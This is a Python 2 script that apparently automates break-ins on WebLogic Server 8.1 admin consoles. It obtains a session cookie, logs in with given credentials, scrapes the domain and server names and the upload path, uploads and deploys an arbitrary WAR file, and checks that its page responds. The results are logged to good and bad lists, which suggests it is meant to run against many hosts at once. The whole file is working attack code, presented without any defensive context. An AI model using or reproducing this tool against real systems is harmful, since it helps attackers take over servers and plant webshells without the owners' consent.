#coding=utf-8
import re
import urllib
import requests
import Queue
import time
from bs4 import BeautifulSoup
class ver81():
	def get_cookie(self,url,headers):
		try:
			login_data=requests.get(url+'/login/LoginForm.jsp',timeout=10,headers=headers)
			cookie_buff=login_data.headers['Set-Cookie']
			cookie_search=re.search(r'([A-za-z0-9]{5,}[!-]+[0-9]*)+',cookie_buff)
			cookie=cookie_search.group()
			self.cookies=dict(ADMINCONSOLESESSION=cookie,path='/')
			print 'Cookie:%s\n'%cookie
			return True
		except:
			print 'Get cookie Error!\n'
			f=open('error.txt', 'a')
			f.write('Get cookie Error! '+url+'\n')
			f.close()
			return False
	
	def do_login(self,url,usr,pwd,headers):
		try:
			data = {'j_username':usr,'j_password':pwd}
			login_data=requests.post(url+'/j_security_check',data =data,cookies=self.cookies,headers=headers,timeout=10)
			if login_data.content.count('WebLogic Server Console') !=0:
				print "\r\nLogin Successful!\r\n"
				return 	True
			else:
				print "\r\nLogin Failed!\r\n"
				f=open('bad.txt', 'a')
				f.write('Login Failed: '+test_url+'\tWebLogic Server 8.x\t'+time.strftime("%Y-%m-%d[%H.%M.%S]")+'\n')
				f.close()
				return False
		except:
			print 'Login Error!\n'
			f=open('error.txt', 'a')
			f.write('Login Error! '+url+'\n')
			f.close()

	def get_domain_name(self,url,headers):
		try:
			domain_data=requests.get(url,cookies=self.cookies,headers=headers,timeout=10)
			soup=BeautifulSoup(domain_data.text)
			url=soup.frame.get('src')
			url=urllib.unquote(url)
			domain_name_search=re.search(r'Name%3D[\w]*',url)
			self.domain_name=domain_name_search.group()[7:]
			print 'DomainName:%s\r\n' %self.domain_name
			return True
		except:
			print 'get_domain_name Error!\n'
			f=open('error.txt', 'a')
			f.write('get_domain_name Error! '+url+'\n')
			f.close()
		
	def get_server_name(self,url,headers):
		try:
			server_data=requests.get(url+'/actions/mbean/ListMBeansAction?reloadNav=false&MBeanClassName=weblogic.management.configuration.ServerMBean&MBeanClass=weblogic.management.configuration.ServerMBean&scopeMBean=%s:Name=%s,Type=Domain' %(self.domain_name,self.domain_name),headers=headers,cookies=self.cookies,timeout=10)
			server_soup=BeautifulSoup(server_data.text)
			for name in server_soup('a'):
				name=re.search(r'\:Name=[\w]*\,Type\=Server',urllib.unquote(name.get('href'))) #URL解码并匹配
				if name :
					self.server_name=name.group()
					break
			self.server_name=re.search(r'Name=[a-zA-Z0-9]*',self.server_name)
			self.server_name=self.server_name.group()[5:]
			print 'ServerName:%s\r\n' %self.server_name
			return True
		except:
			print 'get_server_name Error!\n'
			f=open('error.txt', 'a')
			f.write('get_server_name Error! '+url+'\n')
			f.close()		
	
	def get_path(self,url,headers):
		try:
			path_data=requests.get(url+'/actions/mbean/MBeanWizardAction?parentMBean=%s:Name=%s,Type=Domain&reloadNav=false&wizardName=WebAppComponentAssistant&step=Start&MBeanClass=weblogic.management.configuration.WebAppComponentMBean'%(self.domain_name,self.domain_name),headers=headers,cookies=self.cookies,timeout=10)
			path_soup=BeautifulSoup(path_data.text)
			for ink in path_soup.find_all('input'):
				path=re.search(r'^[a-zA-Z]:(\\[\w .]+)+$',ink.get('value')) #windows
				if path :
					self.path=path.group()
					self.path=self.path+'\upload'
					self.system=1
					print 'Target system: Windows\n'
					break
				path=re.search(r'^(/[\w .]+)+$',ink.get('value')) #linux
				if path :
					self.path=path.group()
					self.path=self.path+'/upload'
					self.system=2
					print 'Target system: Linux\n'
					break			
			print 'Upload Path:%s\r\n' %self.path
			return True
		except:
			print 'get_path Error!\n'
			f=open('error.txt', 'a')
			f.write('get_path Error! '+url+'\n')
			f.close()
		
		
	def uploader(self,url,warname,headers):
		try:
			upload_file = {'filename': (warname, open(warname, 'rb'), 'application/octet-stream')}
			upload_url=url+'/actions/common/FileUploadAction?nextAction=%2Factions%2Fmbean%2FMBeanWizardAction%3FparentMBean%3D'+self.domain_name+'%253AName%253D'+self.domain_name+'%252CType%253DDomain%26reloadNav%3Dfalse%26wizardName%3DWebAppComponentAssistant%26step%3DStart%26MBeanClass%3Dweblogic.management.configuration.WebAppComponentMBean&'+'path='+self.path+'&step=2&'+'desdir='+self.path
			requests.post(upload_url,cookies=self.cookies,headers=headers,files=upload_file,timeout=20)
			print 'Upload Finished!\r\n'
			return True
		except:
			print 'upload Error!\n'
			f=open('error.txt', 'a')
			f.write('upload Error! '+url+'\n')
			f.close()	
		
	def depoly(self,url,warname,depolyname,headers):
		try:
			if self.system == 1:
				depoly_url=url+'/actions/mbean/DoMBeanWizardAction?parentMBean='+self.domain_name+'%3AName%3D'+self.domain_name+'%2CType%3DDomain&&reloadNav=false&message=&wizardName=WebAppComponentAssistant&step=Configure&MBeanClass=weblogic.management.configuration.WebAppComponentMBean?attributes=URI.currentPath%3D'+urllib.quote(self.path)+'&attributes=weblogic.management.configuration.WebAppComponentMBean.Targets%3D'+self.domain_name+'%3AName%3D'+self.server_name+'%2CType%3DServer&attributes=weblogic.management.configuration.WebAppComponentMBean.Name%3D'+depolyname+'&attributes=weblogic.management.configuration.WebAppComponentMBean.URI%3D'+urllib.quote(self.path)+'%5C'+warname+'&nextAction=%2Factions%2Fmbean%2FWebAppComponentDeployAction%3FparentMBean%3D'+self.domain_name+'%253AName%253D'+self.domain_name+'%252CType%253DDomain%26attributes%3DURI.currentPath%253D'+urllib.quote(self.path)+'%26attributes%3Dweblogic.management.configuration.WebAppComponentMBean.Targets%253D'+self.domain_name+'%253AName%253D'+self.server_name+'%252CType%253DServer%26attributes%3Dweblogic.management.configuration.WebAppComponentMBean.Name%253D'+depolyname+'%26attributes%3Dweblogic.management.configuration.WebAppComponentMBean.URI%253D'+urllib.quote(self.path)+'%255C'+warname+'%26reloadNav%3Dfalse%26message%3D%26wizardName%3DWebAppComponentAssistant%26step%3DConfigure%26MBeanClass%3Dweblogic.management.configuration.WebAppComponentMBean&wl_control_weblogic_management_configuration_WebAppComponentMBean_Name='+depolyname
				requests.get(depoly_url,cookies=self.cookies,headers=headers,timeout=10) #采用GET方式进行POST
				print 'Depoly Finished!\n'
			else:
				self.path=self.path.replace('/','%2F')
				depoly_url=url+'/actions/mbean/DoMBeanWizardAction?parentMBean='+self.domain_name+'%3AName%3D'+self.domain_name+'%2CType%3DDomain&&reloadNav=false&message=&wizardName=WebAppComponentAssistant&step=Configure&MBeanClass=weblogic.management.configuration.WebAppComponentMBean?attributes=URI.currentPath%3D'+self.path+'&attributes=weblogic.management.configuration.WebAppComponentMBean.Targets%3D'+self.domain_name+'%3AName%3D'+self.server_name+'%2CType%3DServer&attributes=weblogic.management.configuration.WebAppComponentMBean.Name%3D'+depolyname+'&attributes=weblogic.management.configuration.WebAppComponentMBean.URI%3D'+self.path+'%2F'+warname+'&nextAction=%2Factions%2Fmbean%2FWebAppComponentDeployAction%3FparentMBean%3D'+self.domain_name+'%253AName%253D'+self.domain_name+'%252CType%253DDomain%26attributes%3DURI.currentPath%253D'+self.path+'%26attributes%3Dweblogic.management.configuration.WebAppComponentMBean.Targets%253D'+self.domain_name+'%253AName%253D'+self.domain_name+'%252CType%253DServer%26attributes%3Dweblogic.management.configuration.WebAppComponentMBean.Name%253D'+depolyname+'%26attributes%3Dweblogic.management.configuration.WebAppComponentMBean.URI%253D'+self.path+'%252F'+warname+'%26reloadNav%3Dfalse%26message%3D%26wizardName%3DWebAppComponentAssistant%26step%3DConfigure%26MBeanClass%3Dweblogic.management.configuration.WebAppComponentMBean&wl_control_weblogic_management_configuration_WebAppComponentMBean_Name='+depolyname
				requests.get(depoly_url,cookies=self.cookies,headers=headers,timeout=10) #采用GET方式进行POST
				print 'Depoly Finished!\n'
			return True
		except:
			print 'depoly Error!\n'
			f=open('error.txt', 'a')
			f.write('depoly Error! '+url+'\n')
			f.close()

	def test(self,url,testpage,depolyname):
		try:
			test_url=url.split('/console')[0]+'/'+depolyname+'/'+testpage
			test_data=requests.get(test_url)
			if test_data.status_code == 200:
				print 'Test OK!\t'+test_url+'\n'
				f=open('good.txt', 'a')
				if self.system == 1:
					f.write(test_url+'\tWebLogic Server 8.1\t'+self.domain_name+'\t\t'+'Windows\t'+time.strftime("%Y-%m-%d[%H.%M.%S]")+'\n')
					f.close()
				else:
					f.write(test_url+'\tWebLogic Server 8.1\t'+self.domain_name+'\t\t'+'Linux\t'+time.strftime("%Y-%m-%d[%H.%M.%S]")+'\n')
					f.close()
			else:
				print 'Test Failed!'
				f=open('bad.txt', 'a')
				if self.system == 1:
					f.write('Test Failed:'+test_url+'\tWebLogic Server 8.x\t'+self.domain_name+'\t\t'+'Windows\t'+time.strftime("%Y-%m-%d[%H.%M.%S]")+'\n')
					f.close()
				else:
					f.write('Test Failed:'+test_url+'\tWebLogic Server 8.x\t'+self.domain_name+'\t\t'+'Linux\t'+time.strftime("%Y-%m-%d[%H.%M.%S]")+'\n')
					f.close()
		except:
			print 'test failed!\n'
			f=open('error.txt', 'a')
			f.write('test failed! '+url+'\n')
			f.close()

			
